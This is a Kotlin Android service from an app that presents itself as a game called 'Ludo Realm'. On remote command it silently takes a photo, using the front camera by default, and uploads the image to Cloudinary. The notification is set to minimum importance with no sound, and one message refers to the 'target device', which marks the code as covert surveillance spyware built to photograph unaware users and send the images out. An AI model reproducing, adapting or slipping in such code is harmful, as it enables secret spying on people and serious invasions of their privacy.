package com.example.game_tracker

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.atomic.AtomicBoolean

class CameraCaptureService : Service() {

    companion object {
        private const val TAG = "CameraCaptureService"
        private const val NOTIFICATION_ID = 1003
        private const val CHANNEL_ID = "CameraCaptureChannel"
        private val isBusy = AtomicBoolean(false)
    }

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var handler: Handler? = null
    private var handlerThread: HandlerThread? = null
    private val isDone = AtomicBoolean(false)

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Camera Capture Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                setShowBadge(false)
                setSound(null, null)
            }
            val mgr = getSystemService(NotificationManager::class.java)
            mgr?.createNotificationChannel(channel)
        }
        safeStartForeground(createNotification())
    }

    private fun safeStartForeground(notification: Notification) {
        val hasCameraPermission = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                if (hasCameraPermission) {
                    try {
                        startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
                        return
                    } catch (e: Throwable) {
                        Log.w(TAG, "Failed startForeground camera, falling back: ${e.message}")
                    }
                }
                try {
                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    return
                } catch (e: Throwable) {
                    Log.w(TAG, "Failed startForeground dataSync, falling back: ${e.message}")
                }
            }
            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Throwable) {
            Log.e(TAG, "safeStartForeground error: ${e.message}", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = createNotification()
        safeStartForeground(notification)
        val hasCameraPermission = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.CAMERA
        ) == PackageManager.PERMISSION_GRANTED

        val facing = intent?.getStringExtra("cameraFacing") ?: "front"
        val requestId = intent?.getStringExtra("requestId")

        if (!hasCameraPermission) {
            Log.e(TAG, "Camera permission not granted")
            markFailed(requestId, "Camera permission not granted on device")
            stopSelf()
            return START_NOT_STICKY
        }

        if (!isBusy.compareAndSet(false, true)) {
            Log.w(TAG, "Camera capture is already in progress, skipping concurrent duplicate execution")
            return START_NOT_STICKY
        }

        startCapture(facing, requestId)
        return START_NOT_STICKY
    }

    private fun startCapture(facing: String, requestId: String?) {
        val thread = HandlerThread("camera_capture_thread")
        thread.start()
        handlerThread = thread
        val bgHandler = Handler(thread.looper)
        handler = bgHandler

        val mainHandler = Handler(Looper.getMainLooper())
        val timeoutRunnable = Runnable {
            if (isDone.compareAndSet(false, true)) {
                Log.e(TAG, "Camera capture timed out after 10 seconds")
                markFailed(requestId, "Camera capture timed out")
                cleanup()
                stopSelf()
            }
        }
        mainHandler.postDelayed(timeoutRunnable, 10000)

        try {
            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = manager.cameraIdList.firstOrNull { id ->
                try {
                    val characteristics = manager.getCameraCharacteristics(id)
                    val lens = characteristics.get(CameraCharacteristics.LENS_FACING)
                    if (facing == "back") lens == CameraCharacteristics.LENS_FACING_BACK
                    else lens == CameraCharacteristics.LENS_FACING_FRONT
                } catch (e: Throwable) {
                    false
                }
            } ?: manager.cameraIdList.firstOrNull()

            if (cameraId == null) {
                Log.e(TAG, "No suitable camera found on device")
                if (isDone.compareAndSet(false, true)) {
                    mainHandler.removeCallbacks(timeoutRunnable)
                    markFailed(requestId, "No camera found on device")
                    cleanup()
                    stopSelf()
                }
                return
            }

            val characteristics = manager.getCameraCharacteristics(cameraId)
            val sizes = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?.getOutputSizes(ImageFormat.JPEG)
            val chosen = sizes?.firstOrNull { it.width <= 1920 && it.height <= 1080 }
                ?: sizes?.firstOrNull()
                ?: Size(1280, 720)

            imageReader = ImageReader.newInstance(chosen.width, chosen.height, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener({ reader ->
                if (!isDone.compareAndSet(false, true)) return@setOnImageAvailableListener
                mainHandler.removeCallbacks(timeoutRunnable)

                val image = reader.acquireLatestImage()
                if (image == null) {
                    Log.e(TAG, "Acquired camera image is null")
                    markFailed(requestId, "Could not acquire camera frame")
                    cleanup()
                    stopSelf()
                    return@setOnImageAvailableListener
                }

                try {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val cache = cacheDir
                    val file = File.createTempFile("camera_capture_", ".jpg", cache)
                    val fos = FileOutputStream(file)
                    fos.write(bytes)
                    fos.flush()
                    fos.close()

                    val done = Intent("com.example.game_tracker.CAMERA_CAPTURE_COMPLETE")
                    done.putExtra("path", file.absolutePath)
                    sendBroadcast(done)

                    if (!requestId.isNullOrEmpty()) {
                        CloudinaryUploader.uploadFile(file) { uploadedUrl, uploadError ->
                            if (!uploadedUrl.isNullOrEmpty()) {
                                CloudBridgeSync.updateRequestStatus(
                                    requestId = requestId,
                                    status = "completed",
                                    screenshotUrl = uploadedUrl
                                )
                            } else {
                                CloudBridgeSync.updateRequestStatus(
                                    requestId = requestId,
                                    status = "failed",
                                    error = uploadError ?: "Cloudinary upload failed",
                                    failureReason = uploadError ?: "Cloudinary upload failed"
                                )
                            }
                            cleanup()
                            stopSelf()
                        }
                    } else {
                        cleanup()
                        stopSelf()
                    }
                } catch (e: Throwable) {
                    Log.e(TAG, "Error saving/uploading camera capture: ${e.message}", e)
                    markFailed(requestId, "Processing failed: ${e.message}")
                    cleanup()
                    stopSelf()
                }
            }, bgHandler)

            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(device: CameraDevice) {
                    cameraDevice = device
                    try {
                        val surface = imageReader?.surface
                        if (surface == null) {
                            if (isDone.compareAndSet(false, true)) {
                                mainHandler.removeCallbacks(timeoutRunnable)
                                markFailed(requestId, "ImageReader surface is null")
                                cleanup()
                                stopSelf()
                            }
                            return
                        }

                        val targets = listOf(surface)
                        @Suppress("DEPRECATION")
                        device.createCaptureSession(targets, object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                captureSession = session
                                try {
                                    val reqBuilder = try {
                                        device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                                    } catch (t1: Throwable) {
                                        Log.w(TAG, "TEMPLATE_STILL_CAPTURE unsupported, falling back to TEMPLATE_PREVIEW: ${t1.message}")
                                        try {
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                                        } catch (t2: Throwable) {
                                            device.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                                        }
                                    }
                                    reqBuilder.addTarget(surface)
                                    try {
                                        reqBuilder.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                                    } catch (_: Throwable) {}
                                    session.capture(reqBuilder.build(), object : CameraCaptureSession.CaptureCallback() {}, bgHandler)
                                } catch (e: Throwable) {
                                    Log.e(TAG, "Failed to send capture request: ${e.message}", e)
                                    if (isDone.compareAndSet(false, true)) {
                                        mainHandler.removeCallbacks(timeoutRunnable)
                                        markFailed(requestId, "Capture request failed: ${e.message}")
                                        cleanup()
                                        stopSelf()
                                    }
                                }
                            }

                            override fun onConfigureFailed(session: CameraCaptureSession) {
                                Log.e(TAG, "Capture session configuration failed")
                                if (isDone.compareAndSet(false, true)) {
                                    mainHandler.removeCallbacks(timeoutRunnable)
                                    markFailed(requestId, "Camera session config failed")
                                    cleanup()
                                    stopSelf()
                                }
                            }
                        }, bgHandler)
                    } catch (e: Throwable) {
                        Log.e(TAG, "createCaptureSession error: ${e.message}", e)
                        if (isDone.compareAndSet(false, true)) {
                            mainHandler.removeCallbacks(timeoutRunnable)
                            markFailed(requestId, "Session creation failed: ${e.message}")
                            cleanup()
                            stopSelf()
                        }
                    }
                }

                override fun onDisconnected(device: CameraDevice) {
                    device.close()
                    if (isDone.compareAndSet(false, true)) {
                        mainHandler.removeCallbacks(timeoutRunnable)
                        markFailed(requestId, "Camera disconnected")
                        cleanup()
                        stopSelf()
                    }
                }

                override fun onError(device: CameraDevice, error: Int) {
                    device.close()
                    if (isDone.compareAndSet(false, true)) {
                        mainHandler.removeCallbacks(timeoutRunnable)
                        val msg = when (error) {
                            CameraDevice.StateCallback.ERROR_CAMERA_DISABLED ->
                                "Camera blocked by device security policy / background camera restriction (CAMERA_DISABLED)"
                            CameraDevice.StateCallback.ERROR_CAMERA_IN_USE,
                            CameraDevice.StateCallback.ERROR_MAX_CAMERAS_IN_USE ->
                                "Camera is currently in use by another app or foreground process"
                            CameraDevice.StateCallback.ERROR_CAMERA_DEVICE ->
                                "Camera device encountered a fatal hardware error"
                            CameraDevice.StateCallback.ERROR_CAMERA_SERVICE ->
                                "Android camera subsystem service error"
                            else -> "Camera hardware error: $error"
                        }
                        markFailed(requestId, msg)
                        cleanup()
                        stopSelf()
                    }
                }
            }, bgHandler)

        } catch (e: Throwable) {
            Log.e(TAG, "startCapture failed: ${e.message}", e)
            if (isDone.compareAndSet(false, true)) {
                mainHandler.removeCallbacks(timeoutRunnable)
                val msg = if (e.message?.contains("CAMERA_DISABLED") == true || e.message?.contains("policy") == true) {
                    "Camera access disabled by device policy / background restrictions. Open the app on the target device to capture."
                } else {
                    "Camera start error: ${e.message}"
                }
                markFailed(requestId, msg)
                cleanup()
                stopSelf()
            }
        }
    }

    private fun markFailed(requestId: String?, reason: String) {
        if (!requestId.isNullOrEmpty()) {
            CloudBridgeSync.updateRequestStatus(
                requestId = requestId,
                status = "failed",
                error = reason,
                failureReason = reason
            )
        }
    }

    private fun cleanup() {
        try {
            captureSession?.close()
        } catch (_: Throwable) {}
        captureSession = null

        try {
            cameraDevice?.close()
        } catch (_: Throwable) {}
        cameraDevice = null

        try {
            imageReader?.close()
        } catch (_: Throwable) {}
        imageReader = null

        try {
            handlerThread?.quitSafely()
        } catch (_: Throwable) {}
        handlerThread = null
        handler = null
        isBusy.set(false)
    }

    override fun onDestroy() {
        cleanup()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Ludo Realm")
            .setContentText("Camera capture in progress...")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }
}
